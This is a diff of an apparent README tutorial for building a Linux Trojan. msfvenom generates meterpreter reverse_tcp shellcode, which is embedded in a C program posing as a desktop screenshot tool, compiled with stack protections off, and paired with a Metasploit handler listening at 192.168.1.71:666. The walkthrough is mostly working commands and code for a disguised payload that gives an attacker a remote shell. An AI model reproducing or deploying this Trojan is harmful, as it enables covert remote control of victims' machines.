@@ -39,7 +39,7 @@ but also contains a system command that takes a screenshot to the desktop of the
 
 ### STEP-BY-STEP (HOW-TO)
 
-<br />
+<br /><br />
 
 #### Build shellcode folder
 
@@ -50,22 +50,36 @@ cd shellcode
 
 <br />
 
+#### Start postgresql service
+
+```
+sudo service postgresql start
+```
+
+<br />
+
 #### Use Metasploit to Build Shellcode in C Format
 
 ```
-   ## Build raw shellcode in C
-   # WARNING: Replace LHOST value by your local ip address
-   # WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
-   sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -a x86 --platform linux -f c -o chars.raw
+## Build raw shellcode in C
+# WARNING: Replace LHOST value by your local ip address
+# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
+sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.71 LPORT=666 -a x86 --platform linux -f c -o chars.raw
 
 ```
+
+- **Msfvenom Syntax**
+  - -p payload name
+  - -a payload arch
+  - -f payload format
+  - -o write output to a file 
 
 <br />
 
 #### See whats written inside chars.raw (optional)
 
 ```
-   cat chars.raw
+cat chars.raw
 ```
 
 <br />
@@ -73,7 +87,7 @@ cd shellcode
 #### Parse shellcode data and store it into a local bash variable
 
 ```
-   pa=$(cat chars.raw | grep -v "=" | tr -d '"; ' | tr -d '\n')
+pa=$(cat chars.raw | grep -v "=" | tr -d '"; ' | tr -d '\n')
 ```
 
 <br />
@@ -81,21 +95,21 @@ cd shellcode
 #### Insert the C shellcode created into a C program
 
 ```
-   echo "#include<stdio.h>" > payload.c
-   echo "#include<stdlib.h>" >> payload.c
-   echo "#include<string.h>" >> payload.c
-   echo "" >> payload.c
-   echo "unsigned char buf[] = \"$pa\";" >> payload.c
-   echo "" >> payload.c
-   echo "int main()" >> payload.c
-   echo "{" >> payload.c
-   echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
-   echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
-   echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
-   echo "  system(\"sleep 1; xwud /tmp/ScreenShot.xwd\");" >> payload.c
-   echo "  void (*ret)() = (void(*)())buf;" >> payload.c
-   echo "  ret();" >> payload.c
-   echo "}" >> payload.c
+echo "#include<stdio.h>" > payload.c
+echo "#include<stdlib.h>" >> payload.c
+echo "#include<string.h>" >> payload.c
+echo "" >> payload.c
+echo "unsigned char buf[] = \"$pa\";" >> payload.c
+echo "" >> payload.c
+echo "int main()" >> payload.c
+echo "{" >> payload.c
+echo "  printf(\"[i] Please Wait, Taking Screenshot ..\");" >> payload.c
+echo "  system(\"sleep 1; xwd -root -out /tmp/ScreenShot.xwd\");" >> payload.c
+echo "  printf(\"[i] Screenshot Stored Under: /tmp/ScreenShot.xwd\");" >> payload.c
+echo "  system(\"sleep 1; xwud /tmp/ScreenShot.xwd\");" >> payload.c
+echo "  void (*ret)() = (void(*)())buf;" >> payload.c
+echo "  ret();" >> payload.c
+echo "}" >> payload.c
 ```
 
 <br />
@@ -103,7 +117,7 @@ cd shellcode
 #### See whats written inside payload.c (optional)
 
 ```
-   cat payload.c
+cat payload.c
 ```
 
 <br />
@@ -111,7 +125,7 @@ cd shellcode
 #### Use GCC to compile the C program (make it executable)
 
 ```
- sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
+sudo gcc -fno-stack-protector -z execstack payload.c -o desktop_screenshot
 ```
 
 <br />
@@ -119,9 +133,9 @@ cd shellcode
 #### Start metasploit multi handler
 
 ```
-   # WARNING: Replace LHOST value by your local ip address
-   # WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
-   sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
+# WARNING: Replace LHOST value by your local ip address
+# WARNING: If your attacking a x64 bit system, then change the arch from -a x86 to -a x64
+sudo msfconsole -x 'use exploit/multi/handler; set LHOST 192.168.1.71; set LPORT 666; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'
 ```
 
 <br />
